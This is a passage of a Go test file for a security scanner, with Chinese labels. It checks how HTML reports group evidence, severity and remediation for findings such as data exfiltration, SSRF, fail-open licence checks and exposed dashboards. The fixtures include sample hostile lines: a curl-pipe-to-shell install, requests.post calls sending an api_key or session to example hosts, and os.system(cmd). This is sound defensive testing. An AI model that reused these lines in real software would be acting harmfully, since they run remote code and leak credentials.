package handler

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"skill-scanner/internal/plugins"
	"skill-scanner/internal/review"
)

func TestBuildHTMLReportKeepsCapabilityEvidenceBoundToSameRisk(t *testing.T) {
	base := baseScanOutput{}
	refined := review.Result{
		StructuredFindings: []review.StructuredFinding{{
			ID:             "SF-001",
			RuleID:         "V7-003",
			Title:          "敏感数据外发与隐蔽通道",
			Severity:       "高风险",
			Category:       "外联与情报",
			Confidence:     "高",
			AttackPath:     "外联上传",
			Evidence:       []string{"scripts/run.py:12 requests.post(url, data)"},
			ReviewGuidance: "收敛外联目标并限制外发内容",
			Source:         "static-rule",
		}, {
			ID:             "SF-002",
			RuleID:         "V7-009",
			Title:          "命令执行",
			Severity:       "高风险",
			Category:       "命令执行",
			Confidence:     "高",
			AttackPath:     "shell 执行",
			Evidence:       []string{"scripts/run.py:20 os.system(cmd)"},
			ReviewGuidance: "移除 shell 执行",
			Source:         "static-rule",
		}},
		RuleExplanations:     []review.RuleExplanation{{RuleID: "V7-003", RemediationFocus: "确认外联白名单并限制敏感数据外发"}, {RuleID: "V7-009", RemediationFocus: "移除 shell 与子进程执行"}},
		FalsePositiveReviews: []review.FalsePositiveReview{{FindingID: "SF-001", Verdict: "倾向真实风险"}, {FindingID: "SF-002", Verdict: "倾向真实风险"}},
		CapabilityMatrix: []review.CapabilityConsistency{{
			Capability:     "外联/网络访问",
			StaticDetected: true,
			Status:         "已检测到相关能力",
			RiskImpact:     "可能产生数据外发",
			Evidence:       []string{"规则证据: V7-003 敏感数据外发与隐蔽通道"},
			NextStep:       "核验外联目标与外发内容",
		}, {
			Capability:     "命令执行",
			StaticDetected: true,
			Status:         "已检测到相关能力",
			RiskImpact:     "可能导致任意命令执行",
			Evidence:       []string{"规则证据: V7-009 命令执行"},
			NextStep:       "移除 shell 执行入口",
		}},
		EvidenceInventory: []review.EvidenceInventory{{Category: "外联行为", Count: 1, Examples: []string{"scripts/run.py:12 requests.post(url, data)"}}},
		Behavior:          review.BehaviorProfile{OutboundIOCs: []string{"scripts/run.py:12 requests.post(url, data)"}, ExecuteIOCs: []string{"scripts/run.py:20 os.system(cmd)"}},
	}
	html := buildHTMLReport("demo.zip", "", []plugins.Finding{{RuleID: "V7-003", Severity: "高风险", Title: "敏感数据外发与隐蔽通道"}, {RuleID: "V7-009", Severity: "高风险", Title: "命令执行"}}, base, refined, nil)
	sectionStart := strings.Index(html, "<strong>SF-001 / 敏感数据外发与隐蔽通道</strong>")
	if sectionStart == -1 {
		t.Fatalf("expected outbound finding section in html, got %q", html)
	}
	sectionTail := html[sectionStart:]
	sectionEnd := strings.Index(sectionTail, "</details>")
	if sectionEnd == -1 {
		t.Fatalf("expected outbound finding section to close, got %q", sectionTail)
	}
	section := sectionTail[:sectionEnd]
	if !strings.Contains(section, "代码证据 / scripts/run.py:12") || !strings.Contains(section, "requests.post(url, data)") || !strings.Contains(section, "结构化建议: 收敛外联目标并限制外发内容") {
		t.Fatalf("expected main evidence and remediation rendered together, got %q", section)
	}
	if strings.Contains(section, "0.0.0.0") || strings.Contains(section, "localhost") || strings.Contains(section, "对应证据: 规则证据: V7-009 命令执行") {
		t.Fatalf("expected no local-only endpoint or cross-risk capability evidence in main evidence, got %q", section)
	}
}

func TestBuildMainEvidenceForFindingNormalizesInlineLocatorStyle(t *testing.T) {
	dir := t.TempDir()
	file := filepath.Join(dir, "polymarket.py")
	content := strings.Join([]string{"line 41", "line 42", `GAMMA_API = "https://gamma-api.polymarket.com"`, "line 44", "line 45"}, "\n")
	if err := os.WriteFile(file, []byte(content), 0644); err != nil {
		t.Fatalf("write fixture file failed: %v", err)
	}
	finding := review.StructuredFinding{ID: "SF-001", RuleID: "V7-003", Title: "敏感数据外发与隐蔽通道", Category: "外联与情报", Evidence: []string{file + `:3 GAMMA_API = "https://gamma-api.polymarket.com"`}}
	evidence := buildMainEvidenceForFinding(finding, nil, "已确认风险")
	if len(evidence) != 1 {
		t.Fatalf("expected one normalized main evidence item, got %+v", evidence)
	}
	if !strings.Contains(evidence[0], "polymarket.py:1-5") || !strings.Contains(evidence[0], ">    3 | GAMMA_API") {
		t.Fatalf("expected normalized code-window style evidence, got %q", evidence[0])
	}
}

func TestBuildMainEvidenceForFindingUsesCapabilityEvidenceWhenReviewNotConfirmedAndPrimaryEvidenceMissing(t *testing.T) {
	finding := review.StructuredFinding{ID: "SF-001", RuleID: "V7-003", Title: "敏感数据外发与隐蔽通道", Category: "外联与情报", Evidence: nil}
	evidence := buildMainEvidenceForFinding(finding, []string{"证据: scripts/run.py:12 requests.post(url, data)"}, "需人工复核 / 语义复核器 / 置信度: 高")
	if len(evidence) == 0 {
		t.Fatalf("expected capability evidence added when primary evidence missing")
	}
	if !strings.Contains(strings.Join(evidence, "\n"), "scripts/run.py:12") {
		t.Fatalf("expected outbound capability evidence retained, got %+v", evidence)
	}
}

func TestRenderHTMLCodeEvidenceKeepsBodyForBareLocatorStyleEvidence(t *testing.T) {
	html := renderHTMLCodeEvidence("证据引用: polymarket.py")
	if !strings.Contains(html, "证据引用: polymarket.py") {
		t.Fatalf("expected locator-style evidence preserved in body, got %s", html)
	}
}

func TestRenderHTMLEvidenceListSeparatesCodeContextAndDeclarationEvidence(t *testing.T) {
	html := renderHTMLEvidenceList("关键证据", []string{"scripts/run.py:10\n>   10 | requests.post(url, data)", "证据引用: polymarket.py", "DEPLOYMENT.md: Configuration section", "声明语义: 自动交易代理包含 Flask 仪表板"}, "未提取")
	for _, want := range []string{"代码证据:", "上下文证据:", "声明证据:"} {
		if !strings.Contains(html, want) {
			t.Fatalf("expected grouped evidence section %q, got %s", want, html)
		}
	}
	if !strings.Contains(html, "DEPLOYMENT.md: Configuration section") {
		t.Fatalf("expected deployment evidence retained as declaration/context evidence, got %s", html)
	}
}

func TestRenderHTMLEvidenceListFiltersWeakPlaceholderEvidence(t *testing.T) {
	html := renderHTMLEvidenceList("关键证据", []string{"证据引用: DEPLOYMENT.md: Configuration section；__init__.py: entire file (empty)", "__init__.py: entire file (empty)"}, "未提取")
	if strings.Contains(html, "entire file (empty)") {
		t.Fatalf("expected empty-file placeholder filtered, got %s", html)
	}
}

func TestImpactForFindingUsesCategorySpecificText(t *testing.T) {
	if got := impactForFinding(review.StructuredFinding{Category: "暴露面与未鉴权服务"}); !strings.Contains(got, "未授权访问管理界面") {
		t.Fatalf("expected exposure impact text, got %q", got)
	}
	if got := impactForFinding(review.StructuredFinding{Category: "凭据暴露"}); !strings.Contains(got, "私钥") {
		t.Fatalf("expected credential exposure impact text, got %q", got)
	}
	if got := impactForFinding(review.StructuredFinding{Category: "环境与构建风险"}); !strings.Contains(got, "运行环境污染") {
		t.Fatalf("expected environment risk impact text, got %q", got)
	}
	if got := impactForFinding(review.StructuredFinding{Category: "业务自动化高风险行为"}); !strings.Contains(got, "自动下单") {
		t.Fatalf("expected auto trading impact text, got %q", got)
	}
}

func TestStructuredAttackPathUsesSpecializedLicenseNarrative(t *testing.T) {
	got := structuredAttackPath("授权与许可证校验", plugins.Finding{Title: "许可证本地默认服务需复核", Description: "LICENSE_SERVER 默认指向 http://localhost:8080，校验请求进入 /api/validate", CodeSnippet: `resp = requests.post(f"{LICENSE_SERVER}/api/validate")`}, review.Result{})
	if !strings.Contains(got, "本地默认服务") || !strings.Contains(got, "失败分支") {
		t.Fatalf("expected specialized license attack path, got %q", got)
	}
}

func TestStructuredAttackPathUsesFailOpenLicenseNarrativeWhenBypassSignalPresent(t *testing.T) {
	got := structuredAttackPath("授权与许可证校验", plugins.Finding{
		Title:       "授权绕过风险 - 许可证校验逻辑不闭环",
		Description: "许可证请求失败后继续启用受限能力。",
		CodeSnippet: "if verify_failed { return true }\nresp = requests.post(f\"{LICENSE_SERVER}/api/validate\")",
	}, review.Result{})
	if !strings.Contains(got, "失败后继续放行") || !strings.Contains(got, "fail-open") {
		t.Fatalf("expected fail-open license attack path, got %q", got)
	}
}

func TestStructuredAttackPathUsesSpecializedAutoTradingNarrative(t *testing.T) {
	got := structuredAttackPath("业务自动化高风险行为", plugins.Finding{Title: "自动交易资金风险需复核", Description: "live trading 打开后通过 create_order 自动下单", CodeSnippet: `signed_order = self.client.create_order(order_args)`}, review.Result{})
	if !strings.Contains(got, "自动构造并提交订单") || !strings.Contains(got, "资金操作") {
		t.Fatalf("expected specialized auto trading attack path, got %q", got)
	}
}

func TestStructuredAttackPathUsesContextualNarrativesForDashboardAndBuildRisk(t *testing.T) {
	publicDashboard := structuredAttackPath("暴露面与未鉴权服务", plugins.Finding{Title: "仪表板未鉴权暴露", Description: "管理后台绑定公网地址且缺少身份验证。", CodeSnippet: `app.run(host="0.0.0.0", port=8080)`}, review.Result{})
	if !strings.Contains(publicDashboard, "公网") || !strings.Contains(publicDashboard, "未授权访问者") {
		t.Fatalf("expected public dashboard attack path, got %q", publicDashboard)
	}
	loopbackDashboard := structuredAttackPath("暴露面与未鉴权服务", plugins.Finding{Title: "仪表板未鉴权暴露", Description: "开发态管理面仅监听本地回环地址。", CodeSnippet: `app.run(host="127.0.0.1", port=8080)`}, review.Result{})
	if !strings.Contains(loopbackDashboard, "本地开发") && !strings.Contains(loopbackDashboard, "单机运维") {
		t.Fatalf("expected loopback dashboard attack path, got %q", loopbackDashboard)
	}
	remoteSupplyChain := structuredAttackPath("环境与构建风险", plugins.Finding{Title: "外部脚本与依赖引入风险", Description: "bootstrap 通过远程脚本拉起安装，存在供应链风险。", CodeSnippet: "curl -fsSL https://packages.example.com/install.sh | sh"}, review.Result{})
	if !strings.Contains(remoteSupplyChain, "远程脚本") || !strings.Contains(remoteSupplyChain, "构建阶段") {
		t.Fatalf("expected remote supply chain attack path, got %q", remoteSupplyChain)
	}
	pythonBoundary := structuredAttackPath("环境与构建风险", plugins.Finding{Title: "Python 系统包安装风险", Description: "pip3 install --break-system-packages", CodeSnippet: "pip3 install -r requirements.txt --break-system-packages"}, review.Result{})
	if !strings.Contains(pythonBoundary, "系统 Python 边界") && !strings.Contains(pythonBoundary, "环境污染") {
		t.Fatalf("expected python boundary attack path, got %q", pythonBoundary)
	}
}

func TestStructuredReviewGuidanceUsesSpecializedCategoryText(t *testing.T) {
	if got := structuredReviewGuidance("授权与许可证校验", plugins.Finding{Severity: "高风险"}); !strings.Contains(got, "移除本地默认服务") {
		t.Fatalf("expected specialized license review guidance, got %q", got)
	}
	if got := structuredReviewGuidance("授权与许可证校验", plugins.Finding{Severity: "高风险", Description: "许可证请求失败后继续启用受限能力", CodeSnippet: "if verify_failed { return true }"}); !strings.Contains(got, "失败即拒绝") || !strings.Contains(got, "失败放行分支") {
		t.Fatalf("expected fail-open license review guidance, got %q", got)
	}
	if got := structuredReviewGuidance("授权与许可证校验", plugins.Finding{Severity: "中风险", Description: "LICENSE_SERVER 默认指向 localhost:8080", CodeSnippet: `resp = requests.post(f"{LICENSE_SERVER}/api/validate")`}); !strings.Contains(got, "开发态 fallback") || !strings.Contains(got, "显式配置许可证端点") {
		t.Fatalf("expected localhost fallback license review guidance, got %q", got)
	}
	if got := structuredReviewGuidance("业务自动化高风险行为", plugins.Finding{Severity: "高风险"}); !strings.Contains(got, "默认关闭 live trading") {
		t.Fatalf("expected specialized auto trading review guidance, got %q", got)
	}
	if got := structuredReviewGuidance("外联与情报", plugins.Finding{RuleID: "V7-003", Severity: "中风险", Title: "命中黑名单目标（域名/IP）", Description: "目标命中策略黑名单，需按平台准入策略处理。", CodeSnippet: "目标证据: blacklisted-telematics.example.com\n判定依据: policy blacklist"}); !strings.Contains(got, "准入或合规策略") {
		t.Fatalf("expected specialized policy review guidance, got %q", got)
	}
	if got := structuredReviewGuidance("暴露面与未鉴权服务", plugins.Finding{RuleID: "V7-021", Severity: "高风险", Title: "仪表板未鉴权暴露", Description: "管理后台绑定公网地址且缺少身份验证。", CodeSnippet: `app.run(host="0.0.0.0", port=8080)`}); !strings.Contains(got, "公网监听") && !strings.Contains(got, "前置鉴权网关") {
		t.Fatalf("expected public dashboard guidance, got %q", got)
	}
	if got := structuredReviewGuidance("暴露面与未鉴权服务", plugins.Finding{RuleID: "V7-021", Severity: "低风险", Title: "仪表板未鉴权暴露", Description: "开发态管理面仅监听本地回环地址。", CodeSnippet: `app.run(host="127.0.0.1", port=8080)`}); !strings.Contains(got, "本地开发") && !strings.Contains(got, "回环绑定") {
		t.Fatalf("expected loopback dashboard guidance, got %q", got)
	}
	if got := structuredReviewGuidance("环境与构建风险", plugins.Finding{RuleID: "V7-022", Severity: "高风险", Title: "外部脚本与依赖引入风险", Description: "bootstrap 通过远程脚本拉起安装，存在供应链风险。", CodeSnippet: "curl -fsSL https://packages.example.com/install.sh | sh"}); !strings.Contains(got, "远程脚本") && !strings.Contains(got, "哈希") {
		t.Fatalf("expected remote install guidance, got %q", got)
	}
	if got := structuredReviewGuidance("环境与构建风险", plugins.Finding{RuleID: "LLM-DETECT", Severity: "中风险", Title: "Python 系统包安装风险", Description: "pip3 install --break-system-packages", CodeSnippet: "pip3 install -r requirements.txt --break-system-packages"}); !strings.Contains(got, "虚拟环境") && !strings.Contains(got, "宿主 Python 边界") {
		t.Fatalf("expected python package boundary guidance, got %q", got)
	}
}

func TestStructuredReviewGuidanceUsesOutboundActionTemplates(t *testing.T) {
	if got := structuredReviewGuidance("外联与情报", plugins.Finding{RuleID: "V7-003", Severity: "低风险", Title: "已声明外联回传", Description: "日志仅回传到固定售后平台地址，当前证据落在已声明业务外联。", CodeSnippet: "requests.post('https://after-sales.example.com/logs', json={'vin': vin, 'log_bundle': bundle_path})"}); !strings.Contains(got, "固定业务目标") && !strings.Contains(got, "固定业务目标是否已备案") {
		t.Fatalf("expected fixed target guidance, got %q", got)
	}
	if got := structuredReviewGuidance("外联与情报", plugins.Finding{RuleID: "V7-003", Severity: "中风险", Title: "用户可控外联目标", Description: "上传目标来自请求体，需确认 allowlist、鉴权和字段范围。", CodeSnippet: "requests.post(target, json={'vin': vin, 'bundle': bundle_path})"}); !strings.Contains(got, "allowlist") {
		t.Fatalf("expected user-controlled target guidance, got %q", got)
	}
	if got := structuredReviewGuidance("外联与情报", plugins.Finding{RuleID: "V7-003", Severity: "高风险", Title: "敏感数据外发与隐蔽通道", Description: "检测到 api_key 被外发。", CodeSnippet: "requests.post('https://logs.example.com/report', json={'api_key': api_key})"}); !strings.Contains(got, "高敏感字段") {
		t.Fatalf("expected sensitive outbound guidance, got %q", got)
	}
}

func TestStructuredSSRFAttackPathAndGuidanceUseThreeStageTemplates(t *testing.T) {
	attack := structuredAttackPath("网络请求与SSRF", plugins.Finding{RuleID: "S2-P1-012", Title: "SSRF-内网探测", Description: "三段判定命中：请求调用=resp = requests.get(target)；输入来源=url；来源类型=user_input；危险目标=metadata.google；缺少校验=missing-guard。", CodeSnippet: "resp = requests.get(target)"}, review.Result{})
	if !strings.Contains(attack, "真实请求调用") || !strings.Contains(attack, "云 metadata 目标") || !strings.Contains(attack, "缺少有效白名单") {
		t.Fatalf("expected specialized ssrf attack path, got %q", attack)
	}
	metadataGuidance := structuredReviewGuidance("网络请求与SSRF", plugins.Finding{RuleID: "S2-P1-012", Severity: "高风险", Title: "SSRF-内网探测", Description: "危险目标=metadata.google；缺少校验=missing-guard。", CodeSnippet: "requests.get(target_url)"})
	if !strings.Contains(metadataGuidance, "metadata") || !strings.Contains(metadataGuidance, "host/IP 白名单") {
		t.Fatalf("expected metadata ssrf guidance, got %q", metadataGuidance)
	}
	userControlledGuidance := structuredReviewGuidance("网络请求与SSRF", plugins.Finding{RuleID: "S2-P1-012", Severity: "中风险", Title: "SSRF-内网探测", Description: "来源类型=user_input；缺少校验=missing-guard。", CodeSnippet: "requests.get(target_url)"})
	if !strings.Contains(userControlledGuidance, "allowlist") || !strings.Contains(userControlledGuidance, "用户输入") {
		t.Fatalf("expected controllable target guidance, got %q", userControlledGuidance)
	}
}

func TestStructuredReviewGuidanceUsesDataBoundaryActionTemplates(t *testing.T) {
	if got := structuredReviewGuidance("静态规则发现", plugins.Finding{RuleID: "V7-019", Severity: "中风险", Description: "检测到 dealer_session 随请求同步到售后系统，需确认字段必要性与会话保护边界。", CodeSnippet: "requests.post('https://after-sales.example.com/sync', json={'dealer_session': dealer_session})"}); !strings.Contains(got, "收敛同步目标") {
		t.Fatalf("expected externalization guidance for data boundary finding, got %q", got)
	}
	if got := structuredReviewGuidance("静态规则发现", plugins.Finding{RuleID: "V7-019", Severity: "中风险", Description: "检测到 owner email 被输出到日志，需确认脱敏与最小化策略。", CodeSnippet: "logger.info('owner email=%s', email)"}); !strings.Contains(got, "增加脱敏") {
		t.Fatalf("expected log guidance for data boundary finding, got %q", got)
	}
	if got := structuredReviewGuidance("静态规则发现", plugins.Finding{RuleID: "V7-019", Severity: "高风险", Description: "检测到 api_key 被外发。", CodeSnippet: "requests.post('https://logs.example.com/report', json={'api_key': api_key})"}); !strings.Contains(got, "高敏感凭据") {
		t.Fatalf("expected credential exfiltration guidance for data boundary finding, got %q", got)
	}
}

func TestRenderVerificationSummaryCardSeparatesPolicyActions(t *testing.T) {
	refined := review.Result{
		StructuredFindings: []review.StructuredFinding{{
			ID:         "SF-001",
			RuleID:     "V7-003",
			Title:      "命中黑名单目标（域名/IP）",
			Severity:   "中风险",
			Category:   "外联与情报",
			AttackPath: "访问策略禁止目标",
			Source:     "ThreatIntel",
			Confidence: "中",
			Evidence:   []string{"目标证据: https://example.com"},
		}},
		ReviewAgentVerdicts: []review.ReviewAgentVerdict{{
			FindingID:  "SF-001",
			Verdict:    "policy",
			Reviewer:   "deterministic-vuln-reviewer",
			Confidence: "中高",
		}},
	}

	html := renderVerificationSummaryCard(refined)
	for _, want := range []string{"策略风险 1", "策略处置项", "按准入策略拦截、替换目标或补充白名单依据"} {
		if !strings.Contains(html, want) {
			t.Fatalf("expected policy summary contains %q, got %s", want, html)
		}
	}
}

func TestRenderVerificationSummaryCardShowsClosureGuidanceForManualReview(t *testing.T) {
	refined := review.Result{
		StructuredFindings: []review.StructuredFinding{{
			ID:       "SF-002",
			RuleID:   "V7-001",
			Title:    "命令执行链待补证",
			Severity: "高风险",
			Category: "命令执行",
			Closure: review.FindingClosure{
				Source:         false,
				Transform:      true,
				Sink:           false,
				RuntimeSupport: false,
			},
		}},
		ReviewAgentVerdicts: []review.ReviewAgentVerdict{{
			FindingID:  "SF-002",
			Verdict:    "needs_manual_review",
			Reviewer:   "deterministic-vuln-reviewer",
			Confidence: "中",
		}},
	}

	html := renderVerificationSummaryCard(refined)
	for _, want := range []string{"建议优先：", "补充 source 证据", "补充 sink 证据"} {
		if !strings.Contains(html, want) {
			t.Fatalf("expected manual review summary contains %q, got %s", want, html)
		}
	}
}

func TestRenderVerificationSummaryCardIncludesHTTPFailureReasonCounts(t *testing.T) {
	refined := review.Result{
		Behavior: review.BehaviorProfile{
			ProbeWarnings: []string{"检测到下载与执行信号但未形成时序告警"},
			ScenarioExecutions: []review.ScenarioExecution{{Name: "python-timeout-http-probe", Command: "python3 timeout.py", ExitCode: 124, HTTPPorts: []int{9200}, HTTPPaths: []string{"/healthz"}, Output: []string{"request timed out"}}, {Name: "python-refused-http-probe", Command: "python3 refused.py", ExitCode: 0, HTTPPorts: []int{9450}, HTTPPaths: []string{"/health"}, Output: []string{"http_probe_error error=<urlopen error [Errno 111] Connection refused>"}}},
		},
		Pipeline: []review.PipelineStage{{Name: "sandbox_retry", Status: "completed"}},
	}

	html := renderVerificationSummaryCard(refined)
	for _, want := range []string{"HTTP 失败根因聚合", "probe_timeout=1", "connection_refused=1"} {
		if !strings.Contains(html, want) {
			t.Fatalf("expected verification summary contains %q, got %s", want, html)
		}
	}
}

func TestSortStructuredFindingsByReviewPrioritizesPolicyBeforeManualReview(t *testing.T) {
	refined := review.Result{
		StructuredFindings: []review.StructuredFinding{{ID: "SF-001", RuleID: "V7-003", Title: "命中黑名单目标（域名/IP）", Severity: "中风险", Category: "外联与情报"}, {ID: "SF-002", RuleID: "S2-P1-012", Title: "SSRF-内网探测", Severity: "高风险", Category: "网络请求与SSRF"}},
		ReviewAgentVerdicts: []review.ReviewAgentVerdict{{FindingID: "SF-001", Verdict: "policy"}, {FindingID: "SF-002", Verdict: "needs_manual_review"}},
	}

	sorted := sortStructuredFindingsByReview(refined.StructuredFindings, refined)
	if len(sorted) != 2 || sorted[0].ID != "SF-001" {
		t.Fatalf("expected policy finding sorted before manual review, got %+v", sorted)
	}
}

func TestFalsePositiveChecksIncludesSpecializedCategoryChecks(t *testing.T) {
	licenseChecks := falsePositiveChecks("授权与许可证校验", plugins.Finding{Title: "许可证本地默认服务需复核", Description: "LICENSE_SERVER 默认指向 localhost:8080"}, review.Result{})
	if !strings.Contains(strings.Join(licenseChecks, "\n"), "开发模式") {
		t.Fatalf("expected specialized license false-positive checks, got %+v", licenseChecks)
	}
	failOpenChecks := falsePositiveChecks("授权与许可证校验", plugins.Finding{Title: "授权绕过风险 - 许可证校验逻辑不闭环", Description: "许可证请求失败后继续启用受限能力", CodeSnippet: "if verify_failed { return true }"}, review.Result{})
	if !strings.Contains(strings.Join(failOpenChecks, "\n"), "return true") && !strings.Contains(strings.Join(failOpenChecks, "\n"), "失败即拒绝") {
		t.Fatalf("expected fail-open license false-positive checks, got %+v", failOpenChecks)
	}
	tradeChecks := falsePositiveChecks("业务自动化高风险行为", plugins.Finding{Title: "自动交易资金风险需复核", Description: "create_order live trading"}, review.Result{})
	if !strings.Contains(strings.Join(tradeChecks, "\n"), "默认关闭") {
		t.Fatalf("expected specialized auto trading false-positive checks, got %+v", tradeChecks)
	}
}

func TestDeclarationSubtypeLabelRecognizesAutoTrading(t *testing.T) {
	got := declarationSubtypeLabel(review.StructuredFinding{Category: "声明与行为差异", Evidence: []string{"scripts/polymarket.py:201 signed_order = self.client.create_order(order_args)", "scripts/agent.yaml:8 live trading enabled"}})
	if got != "自动交易" {
		t.Fatalf("expected auto trading declaration subtype, got %q", got)
	}
}

func TestBuildHTMLReportDoesNotReuseSameCapabilityEvidenceContainerAcrossPeerRisks(t *testing.T) {
	base := baseScanOutput{}
	refined := review.Result{
		StructuredFindings: []review.StructuredFinding{{
			ID:             "SF-001",
			RuleID:         "V7-003",
			Title:          "敏感数据外发与隐蔽通道",
			Severity:       "高风险",
			Category:       "外联与情报",
			Confidence:     "高",
			AttackPath:     "scripts/run.py:12-14 | 外联上传",
			Evidence:       []string{"scripts/run.py:12 requests.post(url, data)"},
			ChainSummaries: []string{"行为链: scripts/run.py:12-14 | 外联=1, 收集打包=1"},
			ReviewGuidance: "收敛外联目标并限制外发内容",
			Source:         "static-rule",
		}, {
			ID:             "SF-002",
			RuleID:         "V7-010",
			Title:          "外联回传",
			Severity:       "高风险",
			Category:       "外联与情报",
			Confidence:     "高",
			AttackPath:     "scripts/agent.py:30-34 | 上传压缩结果",
			Evidence:       []string{"scripts/agent.py:31 fetch(uploadURL, archive)"},
			ChainSummaries: []string{"行为链: scripts/agent.py:30-34 | 外联=1, 收集打包=1"},
			ReviewGuidance: "限制结果回传并核验上传目标",
			Source:         "static-rule",
		}},
		RuleExplanations:     []review.RuleExplanation{{RuleID: "V7-003", RemediationFocus: "确认外联白名单并限制敏感数据外发"}, {RuleID: "V7-010", RemediationFocus: "限制上传接口与目标"}},
		FalsePositiveReviews: []review.FalsePositiveReview{{FindingID: "SF-001", Verdict: "倾向真实风险"}, {FindingID: "SF-002", Verdict: "倾向真实风险"}},
		CapabilityMatrix: []review.CapabilityConsistency{{
			Capability:     "外联/网络访问",
			StaticDetected: true,
			Status:         "已检测到相关能力",
			RiskImpact:     "可能产生数据外发",
			Evidence: []string{
				"规则证据: V7-003 敏感数据外发与隐蔽通道",
				"规则证据: V7-010 外联回传",
			},
			NextStep: "核验外联目标与外发内容",
		}},
		EvidenceInventory: []review.EvidenceInventory{{Category: "外联行为", Count: 2, Examples: []string{"scripts/run.py:12 requests.post(url, data)", "scripts/agent.py:31 fetch(uploadURL, archive)"}}},
		Behavior:          review.BehaviorProfile{OutboundIOCs: []string{"scripts/run.py:12 requests.post(url, data)", "scripts/agent.py:31 fetch(uploadURL, archive)"}},
	}
	html := buildHTMLReport("demo.zip", "", []plugins.Finding{{RuleID: "V7-003", Severity: "高风险", Title: "敏感数据外发与隐蔽通道"}, {RuleID: "V7-010", Severity: "高风险", Title: "外联回传"}}, base, refined, nil)
	firstStart := strings.Index(html, "<strong>SF-001 / 敏感数据外发与隐蔽通道</strong>")
	secondStart := strings.Index(html, "<strong>SF-002 / 外联回传</strong>")
	if firstStart == -1 || secondStart == -1 {
		t.Fatalf("expected both outbound findings in html, got %q", html)
	}
	firstSection := html[firstStart : strings.Index(html[firstStart:], "</details>")+firstStart]
	secondSection := html[secondStart : strings.Index(html[secondStart:], "</details>")+secondStart]
	if !strings.Contains(firstSection, "代码证据 / scripts/run.py:12") || !strings.Contains(firstSection, "requests.post(url, data)") || strings.Contains(firstSection, "fetch(uploadURL, archive)") {
		t.Fatalf("expected first risk card to keep only its own evidence, got %q", firstSection)
	}
	if !strings.Contains(secondSection, "代码证据 / scripts/agent.py:31") || !strings.Contains(secondSection, "fetch(uploadURL, archive)") || strings.Contains(secondSection, "requests.post(url, data)") {
		t.Fatalf("expected second risk card to keep only its own evidence, got %q", secondSection)
	}
	if strings.Contains(firstSection, "对应修复建议: 限制结果回传并核验上传目标") || strings.Contains(secondSection, "对应修复建议: 收敛外联目标并限制外发内容") {
		t.Fatalf("expected remediation guidance to stay bound to each finding, got first=%q second=%q", firstSection, secondSection)
	}
}

func TestRenderStructuredFindingCardUsesNormalizedSeverityForLicenseFindings(t *testing.T) {
	refined := review.Result{
		StructuredFindings: []review.StructuredFinding{{
			ID:             "SF-001",
			RuleID:         "V7-005",
			Title:          "许可证本地默认服务需复核",
			Severity:       "高风险",
			Category:       "授权与许可证校验",
			Confidence:     "中",
			AttackPath:     "许可证校验依赖本地默认服务",
			Evidence:       []string{"licensing.py:8 LICENSE_SERVER = \"http://localhost:8080\""},
			ReviewGuidance: "确认 localhost 许可证服务是否只用于开发态 fallback",
			Source:         "static-rule",
		}, {
			ID:             "SF-002",
			RuleID:         "V7-005",
			Title:          "授权绕过风险 - 许可证校验逻辑不闭环",
			Severity:       "高风险",
			Category:       "授权与许可证校验",
			Confidence:     "高",
			AttackPath:     "许可证失败后继续放行",
			Evidence:       []string{"licensing.py:31 if verify_failed { return true }"},
			ReviewGuidance: "先把许可证校验改成失败即拒绝",
			Source:         "static-rule",
		}},
		ReviewAgentVerdicts: []review.ReviewAgentVerdict{{
			FindingID:  "SF-001",
			Verdict:    "needs_manual_review",
			Confidence: "中",
		}, {
			FindingID:  "SF-002",
			Verdict:    "confirmed",
			Confidence: "高",
		}},
	}

	html := renderStructuredFindingsSection(refined)
	localSectionStart := strings.Index(html, "<strong>SF-001 / 许可证本地默认服务需复核</strong>")
	if localSectionStart == -1 {
		t.Fatalf("expected localhost license finding rendered, got %s", html)
	}
	localSection := html[localSectionStart : strings.Index(html[localSectionStart:], "</details>")+localSectionStart]
	if !strings.Contains(localSection, ">低风险<") || strings.Contains(localSection, ">高风险<") {
		t.Fatalf("expected localhost fallback rendered as low severity, got %q", localSection)
	}
	failOpenSectionStart := strings.Index(html, "<strong>SF-002 / 授权绕过风险 - 许可证校验逻辑不闭环</strong>")
	if failOpenSectionStart == -1 {
		t.Fatalf("expected fail-open license finding rendered, got %s", html)
	}
	failOpenSection := html[failOpenSectionStart : strings.Index(html[failOpenSectionStart:], "</details>")+failOpenSectionStart]
	if !strings.Contains(failOpenSection, ">高风险<") {
		t.Fatalf("expected fail-open finding stay high severity, got %q", failOpenSection)
	}
}

func TestBuildHTMLReportShowsLocalLicenseFallbackAsLowSeverityInSampleLikeContext(t *testing.T) {
	base := baseScanOutput{}
	refined := review.Result{
		StructuredFindings: []review.StructuredFinding{{
			ID:             "SF-001",
			RuleID:         "V7-005",
			Title:          "许可证本地默认服务需复核",
			Severity:       "高风险",
			Category:       "授权与许可证校验",
			Confidence:     "中",
			AttackPath:     "许可证校验依赖本地默认服务或固定校验端点",
			Evidence:       []string{"scripts/polymarket.py:16 LICENSE_SERVER = os.getenv(\"LICENSE_SERVER\", \"http://localhost:8080\")", "scripts/polymarket.py:23 resp = requests.post(f\"{LICENSE_SERVER}/api/validate\")", "scripts/dashboard.py:88 app.run(host=\"127.0.0.1\", port=8080)"},
			ReviewGuidance: "先确认 localhost 许可证服务是否只用于开发态 fallback",
			Source:         "static-rule",
		}},
		ReviewAgentVerdicts: []review.ReviewAgentVerdict{{
			FindingID:  "SF-001",
			Verdict:    "needs_manual_review",
			Confidence: "中",
		}},
	}

	html := buildHTMLReport("polymarket-sniper-bot-standalone-1.0.1.zip", "", nil, base, refined, nil)
	sectionStart := strings.Index(html, "<strong>SF-001 / 许可证本地默认服务需复核</strong>")
	if sectionStart == -1 {
		t.Fatalf("expected sample-like license finding in html, got %q", html)
	}
	section := html[sectionStart : strings.Index(html[sectionStart:], "</details>")+sectionStart]
	if !strings.Contains(section, ">低风险<") {
		t.Fatalf("expected local fallback rendered as low severity in html report, got %q", section)
	}
	if !strings.Contains(section, "localhost") || !strings.Contains(section, "/api/validate") {
		t.Fatalf("expected license anchors retained in html report, got %q", section)
	}
}

func TestRenderStructuredFindingCardUsesNormalizedSeverityForDashboardExposure(t *testing.T) {
	refined := review.Result{
		StructuredFindings: []review.StructuredFinding{{
			ID:         "SF-001",
			RuleID:     "V7-021",
			Title:      "仪表板未鉴权暴露",
			Severity:   "中风险",
			Category:   "暴露面与未鉴权服务",
			AttackPath: "仪表板直接监听公网或全部网络接口",
			Evidence:   []string{"dashboard.py:10 app.run(host=\"0.0.0.0\", port=8080)"},
			Source:     "static-rule",
		}, {
			ID:         "SF-002",
